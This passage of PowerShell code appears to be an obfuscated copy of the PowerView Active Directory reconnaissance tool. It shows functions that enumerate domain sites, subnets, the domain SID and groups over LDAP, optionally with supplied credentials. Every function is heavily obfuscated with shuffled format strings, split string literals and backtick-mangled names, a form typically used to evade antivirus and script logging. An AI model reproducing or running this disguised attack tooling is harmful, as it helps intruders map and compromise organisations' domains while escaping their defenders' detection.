                &("{0}{2}{1}" -f'Write-V','se','erbo') ('[G'+'et-'+'Do'+'mainOU] '+'U'+'si'+'ng '+'a'+'ddi'+'t'+'ional '+'LDA'+'P '+'f'+'ilter'+': '+"$LDAPFilter")
                ${f`iLT`eR} += "$LDAPFilter"
            }

            ${ous`Ea`Rch`ER}."fIl`TEr" = "(&(objectCategory=organizationalUnit)$Filter)"
            &("{0}{3}{1}{2}"-f'W','-Ver','bose','rite') "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter) "

            if (${pSbo`U`NdpAra`mETERS}[("{1}{0}"-f'indOne','F')]) { ${Re`s`ULtS} = ${O`USEAR`CH`Er}.("{0}{1}"-f'Find','One').Invoke() }
            else { ${Resul`Ts} = ${ouSEa`RC`heR}.("{0}{1}" -f'Fin','dAll').Invoke() }
            ${res`U`LTS} | &("{0}{2}{1}{3}"-f'Where-','j','Ob','ect') {${_}} | &("{0}{3}{4}{2}{1}" -f 'For','t','ec','E','ach-Obj') {
                if (${psb`ounDPar`AMEt`E`RS}['Raw']) {

                    ${o`U} = ${_}
                }
                else {
                    ${Ou} = &("{3}{0}{2}{4}{1}{5}"-f'nver','DAP','t-','Co','L','Property') -Properties ${_}."prO`P`ERTies"
                }
                ${O`U}."p`SO`Bject"."tYPE`NAm`eS".("{0}{1}"-f 'In','sert').Invoke(0, ("{1}{2}{3}{0}"-f 'ew.OU','P','o','werVi'))
                ${o`U}
            }
            if (${R`E`SulTs}) {
                try { ${ReS`Ul`Ts}.("{0}{1}{2}" -f'dispo','s','e').Invoke() }
                catch {
                    &("{1}{2}{3}{0}" -f 'se','Wr','ite-Verb','o') ('['+'Ge'+'t-Do'+'mai'+'nOU] '+'Erro'+'r'+' '+'dispo'+'sin'+'g '+'o'+'f '+'t'+'he '+'Re'+'su'+'lts '+'o'+'bj'+'ect: '+"$_")
                }
            }
            ${o`USe`AR`CheR}.("{1}{0}{2}"-f 'ispo','d','se').Invoke()
        }
    }
}

function Get-DOM`A`insitE {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}" -f 'Process','u','ld','PSSho'}, '')]
    [OutputType({"{3}{0}{1}{2}"-f'owerV','iew.Si','te','P'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOsItIoN = 0, valUEFrompIPELiNE = ${T`RUe}, ValuefromPIPeLinEbyPrOPeRTyname = ${tR`UE})]
        [Alias({"{1}{0}"-f'me','Na'})]
        [String[]]
        ${I`den`T`Ity},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}"-f 'UID','G'})]
        ${GP`liNk},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OM`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'ter','Fil'})]
        [String]
        ${l`DaPf`IL`TEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prOp`ERt`i`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'h','A','DSPat'})]
        [String]
        ${SEa`RC`hBAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{4}{1}{2}{0}" -f'oller','ont','r','Do','mainC'})]
        [String]
        ${SEr`VeR},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{0}"-f'l','OneLeve'}, {"{2}{1}{0}" -f'ee','tr','Sub'})]
        [String]
        ${SeA`Rch`S`coPe} = ("{1}{0}" -f 'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${re`s`U`LtPAGES`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${ServERTiMe`lI`MiT},

        [ValidateSet({"{1}{0}"-f 'l','Dac'}, {"{0}{1}" -f'Gr','oup'}, {"{0}{1}" -f'Non','e'}, {"{0}{1}" -f'O','wner'}, {"{0}{1}" -f'Sa','cl'})]
        [String]
        ${secuR`ITyM`As`ks},

        [Switch]
        ${T`OmBstO`Ne},

        [Alias({"{1}{2}{0}"-f 'rnOne','Ret','u'})]
        [Switch]
        ${f`i`NdOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`dEN`TiaL} =  ${p`kFEzn}::"Emp`TY",

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${SeAR`C`HeRaRG`U`MEn`Ts} = @{
            ("{1}{3}{4}{2}{0}" -f 'efix','Se','sePr','archB','a') = ("{1}{7}{3}{5}{4}{2}{6}{0}"-f'on','CN=Site','nfigurat',',','Co','CN=','i','s')
        }
        if (${psbOuND`PA`RameT`E`Rs}[("{0}{1}"-f'Dom','ain')]) { ${SeaRCh`e`Rarg`UmE`Nts}[("{1}{0}" -f 'in','Doma')] = ${D`OMain} }
        if (${pSbOUNdP`ArA`M`e`T`eRs}[("{2}{1}{0}"-f'ties','oper','Pr')]) { ${seARc`h`eRArGumE`NTs}[("{1}{0}{2}" -f 'rtie','Prope','s')] = ${p`RoPE`RtiES} }
        if (${psBo`U`NDparAm`ET`eRS}[("{0}{2}{1}" -f 'Sea','e','rchBas')]) { ${se`Ar`CH`Er`ArGUm`entS}[("{1}{0}{2}"-f'hBa','Searc','se')] = ${S`eaRC`HBa`se} }
        if (${pSb`oUND`PA`R`AmeterS}[("{0}{1}"-f'Serve','r')]) { ${Sea`Rc`herar`g`UmEnts}[("{1}{0}" -f'rver','Se')] = ${sER`VEr} }
        if (${P`sBoUNDp`ArAm`EtERS}[("{0}{2}{3}{1}" -f'Se','hScope','a','rc')]) { ${se`ARcheRa`RG`U`MENTS}[("{1}{0}{3}{2}"-f 'ea','S','chScope','r')] = ${se`Ar`CHSCo`Pe} }
        if (${ps`B`OuN`DPAraMETE`Rs}[("{1}{0}{2}{3}{4}" -f'tPageS','Resul','i','z','e')]) { ${seaR`che`R`ARGuMen`Ts}[("{0}{1}{3}{2}" -f'ResultP','ag','ize','eS')] = ${rEsUl`TpA`ges`I`ZE} }
        if (${p`s`BO`UNdpar`AmeTERs}[("{4}{2}{3}{1}{0}"-f'it','im','rTim','eL','Serve')]) { ${S`EaRc`HE`RAR`gumEntS}[("{0}{3}{1}{4}{2}" -f 'Serv','L','mit','erTime','i')] = ${SERvE`R`T`imELI`MiT} }
        if (${p`sBOun`Dp`ARa`MeTe`Rs}[("{2}{0}{1}{3}"-f'r','ityM','Secu','asks')]) { ${Se`AR`CHE`RarG`Ume`NTS}[("{1}{2}{0}" -f 'sks','SecurityM','a')] = ${SEcU`Ritymas`KS} }
        if (${psB`oUNdPA`Ra`MET`ERs}[("{2}{1}{0}" -f'e','on','Tombst')]) { ${S`E`ARch`eR`ARGU`mEnTs}[("{3}{0}{2}{1}" -f't','e','on','Tombs')] = ${T`omb`sTOne} }
        if (${PSbouNdPa`Ram`e`TeRs}[("{2}{1}{0}"-f'l','a','Credenti')]) { ${SEa`RchER`ARG`U`menTs}[("{0}{2}{1}" -f 'Credent','al','i')] = ${CRe`d`enT`Ial} }
        ${s`IT`eSearc`hER} = &("{5}{1}{0}{3}{2}{4}" -f 'i','-Doma','arc','nSe','her','Get') @SearcherArguments
    }

    PROCESS {
        if (${SiT`Ese`AR`CHEr}) {
            ${i`D`E`NTiTY`FIlteR} = ''
            ${FI`lTEr} = ''
            ${I`den`T`ItY} | &("{0}{1}{2}{3}" -f 'Wher','e-','Ob','ject') {${_}} | &("{0}{1}{3}{2}{4}"-f 'F','orEach','j','-Ob','ect') {
                ${iD`EnTITyINSt`AN`Ce} = ${_}.("{1}{2}{0}" -f'ace','Rep','l').Invoke('(', '\28').("{1}{0}{2}" -f'la','Rep','ce').Invoke(')', '\29')
                if (${iDen`Tit`YI`NS`T`ANCE} -match ("{0}{1}"-f '^C','N=.*')) {
                    ${IDEnTit`Y`FIlt`Er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PsBoundP`ARAmE`T`ers}[("{0}{1}" -f 'Do','main')]) -and (-not ${PSbou`N`d`p`AR`AMETers}[("{2}{1}{0}"-f 'e','chBas','Sear')])) {

                        ${Id`ENtitY`do`MaiN} = ${IDEn`TIT`y`i`NSt`ANcE}.("{2}{0}{1}" -f'Stri','ng','Sub').Invoke(${Id`eN`Ti`T`Yinstan`cE}.("{0}{1}"-f 'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{0}{1}{3}" -f'-V','erbo','Write','se') ('[Ge'+'t-Doma'+'in'+'Site] '+'E'+'xtracte'+'d '+'do'+'m'+'ain '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${SEaRC`HerArgU`Me`Nts}[("{1}{0}"-f'main','Do')] = ${Id`En`TITyDOMaiN}
                        ${S`itES`e`ArChEr} = &("{2}{3}{1}{0}{4}" -f 'mainSearch','Do','Get','-','er') @SearcherArguments
                        if (-not ${siTe`SeaR`cHer}) {
                            &("{1}{2}{0}"-f 'Warning','Wr','ite-') ('[Get-'+'Dom'+'ai'+'nSi'+'te] '+'Unab'+'le '+'t'+'o '+'retri'+'e'+'v'+'e '+'doma'+'in '+'searc'+'her'+' '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${gUI`DBY`TEs`T`RING} = (-Join (([Guid]${idE`N`TiTYIn`sT`AN`CE}).("{1}{0}{2}" -f'r','ToByteA','ray').Invoke() | &("{1}{2}{0}{3}" -f 'ach-Objec','F','orE','t') {${_}.("{0}{1}{2}" -f'To','St','ring').Invoke('X').("{1}{0}" -f'ft','PadLe').Invoke(2,'0')})) -Replace ("{0}{1}" -f '(..',')'),'\$1'
                        ${IDEn`T`it`Y`FIlTer} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${IdE`Nt`i`T`Yfilter} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${i`d`ENTiTYFIl`TeR} -and (${iDE`NTiTy`Fi`LteR}.("{0}{1}"-f'Tr','im').Invoke() -ne '') ) {
                ${FI`lter} += "(|$IdentityFilter)"
            }

            if (${pSB`oU`NDpa`RaM`EteRs}[("{0}{2}{1}"-f'GPL','nk','i')]) {
                &("{1}{0}{2}" -f 'ite-','Wr','Verbose') ('['+'G'+'et'+'-Domai'+'nSite] '+'Sea'+'rc'+'hing '+'f'+'or '+'sit'+'es '+'with'+' '+"$GPLink "+'set'+' '+'in'+' '+'the'+' '+'gp'+'Link '+'prop'+'ert'+'y')
                ${f`iL`TeR} += "(gplink=*$GPLink*)"
            }

            if (${pSB`O`Un`dpaRAM`ETE`Rs}[("{1}{0}{2}" -f'A','LD','PFilter')]) {
                &("{0}{3}{2}{1}" -f'W','-Verbose','te','ri') ('['+'Get-Dom'+'ai'+'n'+'Site] '+'Us'+'in'+'g '+'addition'+'al'+' '+'LDAP'+' '+'fi'+'l'+'ter: '+"$LDAPFilter")
                ${fi`lt`er} += "$LDAPFilter"
            }

            ${sITesE`A`RchER}."FI`lTeR" = "(&(objectCategory=site)$Filter)"
            &("{0}{1}{2}"-f 'Wr','ite-V','erbose') "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter) "

            if (${psbOun`D`ParAM`eTERs}[("{0}{1}{2}"-f 'Find','On','e')]) { ${ReS`ULTs} = ${si`T`E`S`eaRcHeR}.("{2}{1}{0}" -f 'll','indA','F').Invoke() }
            else { ${ReS`U`lTs} = ${sITE`s`eAr`cheR}.("{1}{0}" -f 'l','FindAl').Invoke() }
            ${rE`sUL`Ts} | &("{2}{0}{1}{3}" -f'here-Ob','j','W','ect') {${_}} | &("{3}{2}{0}{1}" -f 'Objec','t','ach-','ForE') {
                if (${p`s`BOUN`dPaRA`m`eTerS}['Raw']) {

                    ${Si`Te} = ${_}
                }
                else {
                    ${Si`TE} = &("{4}{5}{0}{3}{2}{1}"-f'ert','Property','DAP','-L','C','onv') -Properties ${_}."P`ROp`ErTI`Es"
                }
                ${s`ite}."p`SOBJe`ct"."T`yPe`NAmeS".("{1}{0}"-f't','Inser').Invoke(0, ("{3}{0}{2}{4}{1}"-f 'we','e','rVie','Po','w.Sit'))
                ${si`Te}
            }
            if (${res`UltS}) {
                try { ${resu`l`Ts}.("{1}{0}" -f'ispose','d').Invoke() }
                catch {
                    &("{0}{1}{2}{3}"-f 'Wr','it','e-Verbo','se') ("{2}{9}{13}{14}{0}{7}{10}{4}{3}{12}{1}{6}{5}{11}{8}" -f'] E','Re','[Get','o',' ','ult','s','rror disposin','ject','-Dom','g','s ob','f the ','ain','Site')
                }
            }
            ${s`iT`eSEaR`cHeR}.("{1}{0}" -f 'pose','dis').Invoke()
        }
    }
}

function gET`-`D`omAiNsu`BneT {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{3}{0}{1}" -f 'oce','ss','PSSho','dPr','ul'}, '')]
    [OutputType({"{1}{2}{0}{4}{3}{5}"-f 'V','Po','wer','ew.S','i','ubnet'})]
    [CmdletBinding()]
    Param (
        [Parameter(posItIoN = 0, VAlUefRompIpeLINE = ${tR`Ue}, ValuefromPipeLINeByPRoperTYnaMe = ${T`Rue})]
        [Alias({"{0}{1}" -f 'Nam','e'})]
        [String[]]
        ${iD`EN`TITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${sItEN`AmE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`M`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'Filt','r','e'})]
        [String]
        ${L`dA`PfIlter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrO`Pe`RtieS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'at','ADSP','h'})]
        [String]
        ${se`Arc`HbaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{2}{1}{0}{3}"-f'o','tr','ainCon','ller','Dom'})]
        [String]
        ${s`E`RvER},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{0}{1}{2}" -f'O','ne','Level'}, {"{2}{1}{0}"-f'e','re','Subt'})]
        [String]
        ${sEArc`H`scOPE} = ("{0}{1}" -f 'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResULtP`A`geSi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRVerT`iME`LIMIT},

        [ValidateSet({"{0}{1}" -f'D','acl'}, {"{0}{1}" -f'Grou','p'}, {"{0}{1}"-f 'No','ne'}, {"{0}{1}" -f'Own','er'}, {"{0}{1}" -f 'S','acl'})]
        [String]
        ${s`eC`UriTymaS`ks},

        [Switch]
        ${T`oMBS`TOnE},

        [Alias({"{0}{3}{1}{2}"-f'Ret','On','e','urn'})]
        [Switch]
        ${FIN`D`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creDEn`T`ial} =  ( &("{1}{2}{0}"-f 'arIabLE','Ge','T-v')  ('pkF'+'ezN')  -vALUeonlY)::"EmP`Ty",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${s`eaRChERA`R`GumENtS} = @{
            ("{3}{4}{0}{2}{1}" -f 'chB','ix','asePref','S','ear') = ("{1}{4}{2}{6}{9}{0}{3}{7}{5}{8}" -f'CN=','C','Su','Sites','N=','Configur','b',',CN=','ation','nets,')
        }
        if (${psB`OU`ND`p`AraMetErs}[("{0}{1}" -f'Dom','ain')]) { ${SE`ARc`HErA`RG`UMEntS}[("{0}{1}"-f 'Dom','ain')] = ${do`ma`in} }
        if (${pSb`o`U`NDpa`RAMET`eRs}[("{0}{3}{2}{1}" -f'Pro','ties','r','pe')]) { ${seA`RCHera`R`GUm`e`NTS}[("{1}{2}{0}" -f 's','Pro','pertie')] = ${Pro`pe`R`TIEs} }
        if (${P`SbOu`NdpARaMe`TerS}[("{1}{2}{0}" -f'e','Sear','chBas')]) { ${sE`ArCH`Erar`gume`NTs}[("{2}{0}{1}" -f 'rc','hBase','Sea')] = ${Sea`R`Ch`BAse} }
        if (${PsbOundP`AR`Am`eteRs}[("{0}{1}" -f'Se','rver')]) { ${SEa`RCHerArG`Um`Ents}[("{1}{0}" -f'rver','Se')] = ${serV`er} }
        if (${PSb`OuN`dPaRAme`T`ers}[("{0}{2}{1}" -f 'Se','pe','archSco')]) { ${SEAR`CH`e`RaRG`UMENts}[("{0}{2}{1}" -f'Sea','e','rchScop')] = ${sEa`R`chs`cOPE} }
        if (${pSBOUN`Dp`A`R`A`meteRs}[("{1}{0}{2}"-f'ltPageS','Resu','ize')]) { ${s`eaRC`HERaRGuM`e`Nts}[("{2}{0}{1}" -f'l','tPageSize','Resu')] = ${resul`T`Pa`ge`SIze} }
        if (${ps`BO`U`Ndp`ArAMEterS}[("{4}{3}{2}{0}{1}"-f'imeLimi','t','T','rver','Se')]) { ${sEa`RCheRARg`UM`E`Nts}[("{2}{1}{0}{3}"-f 'imeLim','rverT','Se','it')] = ${S`ErVER`TIm`eLimIt} }
        if (${p`sBOunD`pAR`AM`eters}[("{3}{2}{0}{1}"-f'ityMask','s','r','Secu')]) { ${s`e`ArcherA`RgUmen`Ts}[("{4}{0}{2}{3}{1}"-f'ityM','ks','a','s','Secur')] = ${S`ec`URitY`mA`sKS} }
        if (${pSBo`Un`dP`A`RAmEtErS}[("{1}{2}{0}{3}" -f 'b','To','m','stone')]) { ${sEaRc`heRA`RG`UM`EntS}[("{0}{2}{1}"-f 'Tom','tone','bs')] = ${TOm`BS`T`onE} }
        if (${pSBouN`DpAR`AME`TE`Rs}[("{0}{1}{2}"-f'Creden','tia','l')]) { ${SEa`Rc`hEr`ArgumenTs}[("{2}{0}{1}" -f're','dential','C')] = ${Cre`De`NtIaL} }
        ${sUbnE`Ts`eARCH`er} = &("{2}{4}{3}{1}{0}{5}"-f 'h','rc','Get-D','a','omainSe','er') @SearcherArguments
    }

    PROCESS {
        if (${SUbNeTS`EARch`eR}) {
            ${i`dENt`ITYfilt`Er} = ''
            ${F`iL`TER} = ''
            ${I`De`Nt`ItY} | &("{0}{2}{1}"-f'W','t','here-Objec') {${_}} | &("{2}{0}{1}" -f'orEach-O','bject','F') {
                ${IdEN`TI`Tyi`N`staNCe} = ${_}.("{1}{0}{2}" -f'epl','R','ace').Invoke('(', '\28').("{0}{1}{2}"-f'Re','plac','e').Invoke(')', '\29')
                if (${IdE`Nti`Tyi`NSTance} -match ("{1}{0}{2}"-f 'N=.','^C','*')) {
                    ${i`dENtITyf`iLt`Er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PSbo`UndparAme`T`ERs}[("{1}{0}"-f 'ain','Dom')]) -and (-not ${pSBo`U`NDParam`E`TeRs}[("{0}{1}{2}" -f'Sea','r','chBase')])) {

                        ${IdENTI`TY`doma`IN} = ${iD`e`NtITYIN`sTANCE}.("{3}{0}{2}{1}"-f'ubS','ring','t','S').Invoke(${I`D`ENtI`TyINS`TAnCe}.("{1}{2}{0}"-f 'f','I','ndexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{1}{3}{2}"-f 'W','ri','e-Verbose','t') ('[G'+'e'+'t-Dom'+'ainSubnet] '+'Extrac'+'ted'+' '+'domai'+'n'+' '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${seaR`CHERArgUme`N`Ts}[("{0}{1}"-f 'D','omain')] = ${IDE`Nt`I`TyD`OMain}
                        ${SuBn`ETseA`RC`H`ER} = &("{1}{3}{2}{0}"-f 'archer','Get','DomainSe','-') @SearcherArguments
                        if (-not ${SubneT`sEaRc`H`eR}) {
                            &("{0}{2}{3}{1}" -f 'Writ','ng','e-War','ni') ('['+'Get'+'-DomainSub'+'n'+'et]'+' '+'U'+'nable '+'to'+' '+'re'+'tr'+'ieve '+'d'+'om'+'ain '+'s'+'e'+'archer '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${GUIDbY`TeSt`R`iNg} = (-Join (([Guid]${ideNt`iTY`insT`ANce}).("{1}{0}{2}{3}"-f 'oByteAr','T','r','ay').Invoke() | &("{0}{2}{1}"-f 'ForEac','ect','h-Obj') {${_}.("{2}{0}{1}" -f'oStr','ing','T').Invoke('X').("{1}{2}{0}" -f'Left','Pa','d').Invoke(2,'0')})) -Replace (("{1}{0}" -f '..)','(')),'\$1'
                        ${i`D`ent`ItYFI`lTEr} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${iD`entityF`iltEr} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${ID`eNTI`T`YfiL`TeR} -and (${i`de`NTiTyFIlt`Er}.("{0}{1}" -f'Tr','im').Invoke() -ne '') ) {
                ${FilT`Er} += "(|$IdentityFilter)"
            }

            if (${ps`BouNDP`AraM`E`TeRS}[("{2}{0}{1}" -f 'APFilte','r','LD')]) {
                &("{1}{2}{0}" -f'Verbose','Write','-') ('[G'+'et-Doma'+'inSubn'+'e'+'t] '+'Us'+'ing '+'a'+'dd'+'itional '+'LDA'+'P '+'fil'+'ter:'+' '+"$LDAPFilter")
                ${FIl`TeR} += "$LDAPFilter"
            }

            ${suBN`etSe`A`RCH`ER}."F`iltEr" = "(&(objectCategory=subnet)$Filter)"
            &("{0}{2}{1}{3}"-f'Writ','-','e','Verbose') "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter) "

            if (${P`sBou`N`D`PaRAmeTERs}[("{0}{1}{2}" -f'F','indOn','e')]) { ${Res`U`ltS} = ${suBn`etSEA`RCh`Er}.("{0}{1}"-f'Find','One').Invoke() }
            else { ${REsU`Lts} = ${suBN`ET`S`EA`RCHER}.("{1}{0}"-f 'indAll','F').Invoke() }
            ${RE`s`Ults} | &("{1}{0}{2}"-f'here-Obje','W','ct') {${_}} | &("{2}{1}{3}{0}" -f'ect','orEa','F','ch-Obj') {
                if (${P`sB`ou`NdParam`E`TERS}['Raw']) {

                    ${s`UbN`Et} = ${_}
                }
                else {
                    ${s`Ub`Net} = &("{2}{0}{1}{3}" -f'-LDAP','Prop','Convert','erty') -Properties ${_}."pR`OP`ErTiEs"
                }
                ${s`U`BNet}."p`SOBJE`cT"."ty`PEnaMES".("{2}{1}{0}"-f't','r','Inse').Invoke(0, ("{3}{1}{2}{0}" -f't','rV','iew.Subne','Powe'))

                if (${P`S`BoU`NDPaRaMETe`RS}[("{2}{0}{1}" -f'e','Name','Sit')]) {

                    if (${S`Ub`NEt}."p`R`oPe`RtIES" -and (${s`UB`NET}."P`ROPE`RTiES"."S`It`Eo`BJecT" -like "*$SiteName*")) {
                        ${SUb`N`Et}
                    }
                    elseif (${Sub`NEt}."SIteo`B`JeCt" -like "*$SiteName*") {
                        ${Su`Bn`ET}
                    }
                }
                else {
                    ${sUb`NEt}
                }
            }
            if (${re`su`LTs}) {
                try { ${rEsuL`TS}.("{2}{0}{1}" -f 'pos','e','dis').Invoke() }
                catch {
                    &("{1}{0}{3}{2}" -f'e-Verbo','Writ','e','s') ('[Get-Do'+'main'+'Subn'+'et]'+' '+'E'+'rror '+'dis'+'p'+'osing '+'o'+'f '+'th'+'e '+'Resu'+'lts '+'ob'+'ject:'+' '+"$_")
                }
            }
            ${sUB`NETs`eaR`ch`eR}.("{0}{2}{1}" -f 'd','ose','isp').Invoke()
        }
    }
}

function GEt-`do`mAINs`iD {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}" -f 'houldProcess','P','SS'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{4}{0}{1}" -f 'll','er','ainContr','Dom','o'})]
        [String]
        ${s`ER`VER},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`DeNTIAL} =  ( &("{1}{0}"-f 'eM','It')  ("V"+"ar"+"iABLE:P"+"k"+"feZN") )."VaL`UE"::"e`MPTy"
    )

    ${sE`AR`chErA`RgU`m`ENtS} = @{
        ("{0}{3}{2}{1}"-f'L','er','lt','DAPFi') = (("{13}{5}{11}{6}{1}{10}{4}{12}{9}{2}{0}{7}{3}{8}"-f '556.1.4.80','ol:','13','=8','.2.','se','AccountContr','3:','192)','1','1','r','840.','(u'))
    }
    if (${pS`BOU`Nd`Pa`RaMEterS}[("{1}{0}{2}" -f 'ai','Dom','n')]) { ${se`Ar`ch`eRAr`gUmENTs}[("{1}{2}{0}" -f'in','Do','ma')] = ${d`oMa`In} }
    if (${pSbO`UnD`paRame`T`eRs}[("{0}{1}"-f'Serve','r')]) { ${sEa`RcH`ERArG`U`meN`TS}[("{0}{1}" -f 'Ser','ver')] = ${s`eRV`er} }
    if (${psBou`Nd`pa`RamEtErs}[("{2}{1}{0}"-f 'l','tia','Creden')]) { ${s`Earch`e`Ra`RGuments}[("{2}{1}{0}" -f'al','ti','Creden')] = ${Cr`ED`EN`Tial} }

    ${d`cS`ID} = &("{2}{0}{3}{4}{5}{1}"-f't-D','r','Ge','o','m','ainCompute') @SearcherArguments -FindOne | &("{0}{4}{3}{2}{1}" -f'Selec','t','jec','b','t-O') -First 1 -ExpandProperty ("{1}{0}" -f'd','objectsi')

    if (${D`cSId}) {
        ${dc`SiD}.("{2}{0}{1}"-f'bS','tring','Su').Invoke(0, ${D`cs`Id}.("{1}{0}{2}"-f'ndexO','LastI','f').Invoke('-'))
    }
    else {
        &("{3}{1}{2}{0}"-f 'se','te-Ver','bo','Wri') ('[Get-Doma'+'inSI'+'D] '+'Erro'+'r '+'e'+'xt'+'rac'+'ting '+'domai'+'n '+'S'+'ID '+'f'+'or '+"'$Domain'")
    }
}

function get-`dO`maiNGr`O`UP {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}"-f'PS','ShouldPr','ocess'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{5}{0}{3}{2}{8}{7}{4}{1}"-f'seDe','ssignments','la','c','sMoreThanA','U','PS','dVar','re'}, '')]
    [OutputType({"{3}{2}{1}{0}" -f'oup','Gr','.','PowerView'})]
    [CmdletBinding(DeFaULTPaRameTeRsETname = {"{0}{2}{1}"-f 'AllowDel','tion','ega'})]
    Param(
        [Parameter(posITion = 0, vAlUefroMpiPeliNE = ${T`RUe}, ValuEFroMpipeLinebyPropeRTYNamE = ${TR`Ue})]
        [Alias({"{4}{2}{0}{3}{1}" -f 'guis','Name','n','hed','Disti'}, {"{3}{0}{1}{2}"-f 't','Na','me','SamAccoun'}, {"{1}{0}" -f'me','Na'}, {"{3}{0}{2}{5}{1}{4}" -f'be','isting','r','Mem','uishedName','D'}, {"{0}{1}{3}{2}" -f 'Mem','b','Name','er'})]
        [String[]]
        ${I`denT`ity},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'me','UserNa'})]
        [String]
        ${m`E`MbER`Ide`NTIty},

        [Switch]
        ${ADmI`NC`o`UnT},

        [ValidateSet({"{2}{1}{0}" -f 'Local','in','Doma'}, {"{1}{0}{2}{4}{3}" -f 'otDo','N','ma','nLocal','i'}, {"{0}{1}" -f 'Globa','l'}, {"{2}{0}{1}"-f 'otGloba','l','N'}, {"{2}{0}{1}"-f 'niver','sal','U'}, {"{3}{0}{2}{1}"-f'niv','l','ersa','NotU'})]
        [Alias({"{0}{1}"-f 'Sc','ope'})]
        [String]
        ${gr`O`UPScOpE},

        [ValidateSet({"{0}{2}{1}"-f 'Sec','rity','u'}, {"{1}{0}{2}"-f'tribu','Dis','tion'}, {"{2}{0}{1}{3}"-f'dBy','Sy','Create','stem'}, {"{3}{0}{1}{2}" -f'o','t','CreatedBySystem','N'})]
        [String]
        ${Grou`ppro`Pe`R`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`Om`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'lte','Fi','r'})]
        [String]
        ${Ld`A`PfI`lTer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`Ro`PErTies},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'DSPath','A'})]
        [String]
        ${sEaRC`H`B`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{4}{3}" -f'D','o','m','ntroller','ainCo'})]
        [String]
        ${S`ERv`er},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{0}" -f'eLevel','On'}, {"{1}{0}" -f 'e','Subtre'})]
        [String]
        ${SearC`H`scope} = ("{0}{1}{2}" -f'Sub','t','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSu`l`TPA`g`EsIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`R`VeRTImE`l`iMit},

        [ValidateSet({"{0}{1}"-f 'Dac','l'}, {"{1}{0}"-f'up','Gro'}, {"{1}{0}"-f'e','Non'}, {"{0}{1}" -f 'Ow','ner'}, {"{1}{0}" -f 'l','Sac'})]
        [String]
        ${SecuRitYm`A`sks},

        [Switch]
        ${tomBs`To`NE},

        [Alias({"{0}{2}{1}"-f 'Ret','rnOne','u'})]
        [Switch]
        ${f`indo`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`EDe`NTiaL} =  ${PKf`EzN}::"eMp`Ty",

        [Switch]
        ${R`Aw}
    )

    BEGIN {
        ${S`EaRcHe`Ra`Rg`UmentS} = @{}
        if (${p`SB`O`UNDPARaMe`TErs}[("{0}{1}"-f'Doma','in')]) { ${searcH`ERARG`UmeN`Ts}[("{0}{1}" -f 'D','omain')] = ${D`om`Ain} }
        if (${pSb`O`UNDPA`RaM`eteRS}[("{1}{2}{0}"-f 'ties','Prop','er')]) { ${SeArC`H`Er`ArgUm`eNTs}[("{0}{2}{1}" -f 'Pro','ies','pert')] = ${Pr`oPERT`iES} }
